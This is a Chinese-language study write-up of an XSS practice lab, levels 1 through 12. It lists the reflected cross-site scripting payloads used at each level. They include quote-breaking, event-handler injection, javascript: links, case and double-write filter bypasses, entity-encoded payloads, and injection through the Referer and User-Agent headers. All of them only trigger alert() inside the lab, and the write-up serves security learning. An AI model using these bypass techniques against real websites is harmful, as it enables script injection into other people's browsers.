# XSS labs 学习

## level 1

对于XSS漏洞，我们首先需要的是找到在哪里插入。我们尝试在 url 栏的 name字段后输入1 发现页面出现了1 那么插入点就在这里。

第一关很简单使用简单的语句

```javascript
<script>alert("XSS")</script>
```

弹窗成功

![image-20221017191916729](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221017191916729.png)

## level 2

我们仍然首先输入上面的语句

```javascript
<script>alert("XSS")</script>
```

发现没有弹窗，我们通过查看源代码

![image-20221017192404148](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221017192404148.png)

发现需要闭合 ==“==和==>==

那么我们输入

```javascript
"><script>alert("XSS")</script>
```

弹窗成功

![image-20221017192539551](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221017192539551.png)

## level 3

在这一关，与前面的有区别。我们依然首先输入

```javascript
<script>alert("XSS")<script>
```



发现没有反应，我们查看源代码。发现==script==被转义了

![image-20221017194834465](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221017194834465.png)

那么我们就不可以使用==<script>alert("XSS")</script>==

我们通常还有两种方法

onmouseover
onclick

我们还需要将后面的内容注释掉 这里我们用的是 ==//==单行注释符

```javascript
'onclick=alert(1)//
'onmouseover=alert(1)//
```

## level 4

 绕过思路与上一题类似，将单引号改为 双引号就可以了。

## level 5

这一关当中将 on 字段和 <script>字段都进行了过滤 ，我们尝试使用大写绕过，还是没有办法。尝试使用的一个新的标签。

```html
```<a href=javascript:alert('xss') > xss</a>
```

查看源代码发现没有被过滤，但是前面还没由成功闭合，所以无法得到想要的结果。我们将前面的闭合掉就可以了

payload

```javascript
"><a href=javascript:alert('xss') > xss</a>
```

点击旁边的蓝色字体就可以过关

## level 6

我们还是将上一关的payload粘贴上去，看是否可以成功。发现被过滤掉了。尝试大小写绕过。成功。。。

我后面测试了一些，不论是href大写还是 <script>大小写都是可以的

payload 

```javascript
"><a HrEf=javascript:alert("xss")>xss</a>//
```

## level 7

 我们还是先将上面一关的语句粘贴过去，然后查看源代码，我们发现输入的script和href都被过滤为空了，由于这里是将恶意代码转化为空，我们联想到，如果只过滤一次的话，那么就可以通过双写绕过。尝试一下呢。。

```javascript
"><a hrhrefef=javascscriptript:alert("xss")>xss</a>//
```

成功弹窗

## level 8

现在又是将其加入下划线，导致标签里的内容失效。重复上面的思路。发现还是没有办法。这里尝试用`unicode`编码

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;
```

成功弹窗

## level 9

这次这个有点扯，直接说我的链接不合法。没办法查看源码吧。。

![image-20221208150511039](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221208150511039.png)



根据源代码写pay load

```javascript
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;//http://www.baidu.com
```

成功弹窗。这一关感觉就是代码审计。

## level 10

这里还是先找到点，插入一段基础的 XSS语句

发现没有反应，查看源代码

增加了三个 input标签，也就是有了三个参数。

对三个参数进行这样的测试

```javascript
?keyword=<script>alert('xss')</script>&t_link=" type="text"&t_history=" type="text"&t_sort=" type="text"
```

从页面响应来看，有一个`<input>`标签的状态可以被改变。这个标签就是名

为`t_sort`的`<input>`标签，之前都是隐藏状态，但是通过构造参数响应发现只

有它里面的值被改变了。

因此可以从该标签进行突破，尝试能不能注入恶意代码进行弹窗。

构造如下代码：

```javascript
?keyword=<script>alert('xss')</script>&t_sort=" type="text" onclick="alert('xss')
```

然后点击输入框成功弹窗

## level 11

这一关和前面的出现了区别，前面的基本上都是在网页上进行的。不论是在 url 栏里面还是在 输入框中。这一关有些用hackbar 有些用的是burp 都可以。

首先我们输入XSS的简单语句，查看源代码，发现 t_sort还是可以接受参数。。但是里面的双引号被编码了，这样浏览器只能正常显示字符但是却无法起到闭合的作用了。

抓包发现没有 referer 字段。在hackbar上添加，在后面随便写点数据，再查看页面源代码，发现成功写入进去了。

构造payload

```html
type="text" onclick="alert('xss')
```



![image-20221208173909977](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221208173909977.png)

成功弹窗，这关虽然构造的代码不是很复杂，但是我最开始做了好久都没想到。这里面有一个很严重的误区。我们不应该把想法只想到网页当中，其实在数据包中也可以完成XSS语句插入。这一点和我们的sql注入很类似。

## level 12

有了上一关的基础，我们应该感觉的到这一关可能还是在数据包中插入（好多靶场都是这个套路，相同类型的题安排在一起），

![image-20221208174736231](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221208174736231.png)

这段一看就是 UA 的信息莽

直接上hack bar测试

直接在 UA 的内容后插入和上一关一模一样的代码

```javascript
"type="text" onclick="alert('xss')
```

![image-20221208174918508](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221208174918508.png)





















